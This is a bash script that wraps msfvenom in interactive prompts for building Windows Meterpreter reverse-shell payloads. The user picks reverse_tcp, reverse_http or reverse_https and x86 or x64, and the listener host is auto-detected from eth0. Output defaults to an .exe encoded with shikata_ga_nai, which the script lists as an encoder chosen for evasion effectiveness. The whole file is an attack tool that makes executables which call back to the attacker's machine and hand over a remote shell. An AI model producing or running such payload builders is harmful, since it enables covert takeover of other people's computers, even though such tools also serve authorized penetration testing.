#! /bin/bash

function debug() 
{
	echo "$@"
}

function ext()
{
	output="$file"".""$format"
	
}

function payload()
{
#payload
	printf "Set a payload:[reverse_tcp]  \n1:reverse_tcp  \n2:reverse_http  \n3:reverse_https  \n" 
	read pl
	if [ -z $pl ]
	then
		pl=1
	fi

	read -p "create payload as x64 exclusive?[y/n] " ex 
	
	#Substitude blank as no
	if [ -z $ex ]
	then
		ex=n
	fi

	#Adding appropriate command depending on inputs
	if [ $ex = "y" ] || [ $ex = "Y" ]
	then
		pload="windows/x64/"
	else
		pload="windows/"
	fi

	case $pl in
		1)
			pload+="meterpreter/reverse_tcp"
			;;
		2)	
			pload+="meterpreter/reverse_http"
			;;
		3)
			pload+="meterpreter/reverse_https"
			;; 
		*)
			pload+="meterpreter/reverse_tcp"
			;;
	esac
}

function encryption()
{
	#file encryption
	read -p "Select encryption encoder, press l to list the available encryption:[ x86/shikata_ga_nai ] " en

	if [ -z $en ]
	then
		en="x86/shikata_ga_nai"
	#Show list of encrption (Only picked great or better effectiveness)
	else
		case $en in
			"l")
				printf "\nCommand                       Effectiveness     Description\n"
				printf "x86/shikata_ga_nai            excellent  	Polymorphic XOR Additive Feedback Encoder \n"
				printf "cmd/powershell_base64         excellent  	Powershell Base64 Command Encoder\n"
				printf "php/base64                    great      	PHP Base64 Encoder\n"
				printf "ruby/base64                   great      	Ruby Base64 Encoder\n\n\n\n"
				#shift
				encryption	
				;;
			*)
				echo "$en"
		esac	
	fi
}




function execute()
{
	clear
	printf "Payload = $pload \nHost = $host \nPort = $port \nFormat = "."$format \nEncryption = $en \nFile name = $output \n\n"
	read -p "Is the above attribute correct?[y/n] "	cmf
	if [ -z $cmf ]
	then
		cmf="y"
	fi

	if [ $cmf = "y" ] || [ $cmf = "Y" ]
	then
		
		printf "Comfirmed, creating payload...\n\n"
		msfvenom -p $pload LHOST=$host LPORT=$port -f $format -e $en -o $output
		
		exit
		
	else
		printf "Comfirmation denied, restart probing.."
		sleep 3s
		clear
	fi
}

function main ()
{	
	payload

	#host ip will be set dynamically
	host="$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')" 

	#portnumber
	read -p "Select port number as listener [4444] :  " port
	if [ -z $port ]
	then
		port="4444"
	fi

	#file extension
	read -p "What format would you want the payload to be? [exe] :  " format
	if [ -z $format ]
	then
	format="exe"
	fi

	encryption


	#file output name
	read -p "what is the name of the output file? No extension is required. [pl] :  " file

	#Substitude blank as PL(payload)	
	if [ -z $file ]
	then
		file="pl"
	fi
	ext $file $format

	execute $pload $host $port $format $output
}


echo " __  __ ____  _____                                 "
echo "|  \/  / ___||  ___|_   _____ _ __   ___  _ __ ___  "
echo "| |\/| \___ \| |_  \ \ / / _ \ '_ \ / _ \| '_   _ \ "
echo "| |  | |___) |  _|  \ V /  __/ | | | (_) | | | | | |"
echo "|_|  |_|____/|_|     \_/ \___|_| |_|\___/|_| |_| |_|"

printf "\n\n"
sleep 0.5s
while [ true ]
do
	main
done
